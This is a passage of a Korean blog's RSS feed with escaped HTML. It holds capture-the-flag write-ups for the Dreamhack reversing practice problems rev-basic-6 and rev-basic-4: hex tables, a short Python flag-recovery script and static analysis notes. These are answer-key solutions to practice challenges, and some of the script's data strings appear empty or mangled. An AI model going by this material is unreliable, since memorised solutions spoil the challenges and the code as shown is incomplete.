class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ED&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;간단한 해결책&lt;/p&gt;

&lt;p&gt;byte_140003000 인덱스 0부터 끝까지 하나씩 돌림&lt;/p&gt;

&lt;p&gt;byte_140003020 내부에서 byte_140003000[i] 가 존재한다면 해당 인덱스는 뭔지 저장&lt;/p&gt;

&lt;p&gt;코딩 ㄱ&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;00 4D 51 50 EF FB C3 CF 92 45 4D CF F5 04 40 50 43 63&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003000_str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&aposapos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003020_str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003020_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;결과&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_19.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_19.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-6</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-6</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-4 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-분석&quot; id=&quot;markdown-toc-0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000&quot; id=&quot;markdown-toc-21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;PE64&lt;/li&gt;
  &lt;li&gt;C언어로 작성&lt;/li&gt;
  &lt;li&gt;패킹은 안됐을 것 같아서 검사 패스&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;큰일났다 사전에 문제 4개 풀기로 합의했는데 그거 쌩짜로 까먹고 2개라고 굳세게 주장하면서 나만 2개 풀었다&lt;/p&gt;

&lt;p&gt;이제부터 엉덩이에 먼지나게 문제푼다 실시&lt;/p&gt;

&lt;p&gt;사용자 인풋을 콘솔 통해서 stdin으로부터 받음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001220&lt;/code&gt;은 사용자 입력값을 scanf 계열 함수를 사용해 받을 것이다&lt;/p&gt;

&lt;p&gt;확인해 보니 맞다&lt;/p&gt;

&lt;p&gt;검증 루틴인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001000&lt;/code&gt;을 확인해 보자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이렇게 보니까 영 가독성이 떨어진다. 변수를 바꿔서 예쁘게 보이도록 해주자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;검증 루틴의 루프가 총 0x1C회 돌기 때문에, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;byte_140003000&lt;/code&gt; 배열은 총 28 byte의 데이터를 담고 있을 것이다.&lt;/p&gt;

&lt;p&gt;그렇다면 해당 배열에는 어떤 데이터가 들어있을까?&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt; &lt;span 